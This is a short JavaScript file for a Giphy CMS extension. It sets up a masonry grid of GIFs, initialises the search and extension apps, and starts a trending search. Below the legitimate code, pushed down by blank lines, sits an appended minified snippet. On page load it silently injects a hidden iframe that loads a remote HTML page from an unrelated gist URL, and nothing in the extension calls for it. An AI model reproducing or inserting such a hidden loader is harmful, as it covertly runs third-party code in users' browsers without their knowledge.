jQuery(document).ready(function() {
  jQuery('#gifs').masonry({
    itemSelector: '#gifs li',
    columnWidth: 145,
    gutter: 10,
    transitionDuration: '0.2s',
    isFitWidth: true
  });

  // init giphy
  GiphySearch.init();

  // init the CMS extension app
  GiphyCMSExt.init();

  // start the default search
  GiphySearch.search("giphytrending", 100, true);
});





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});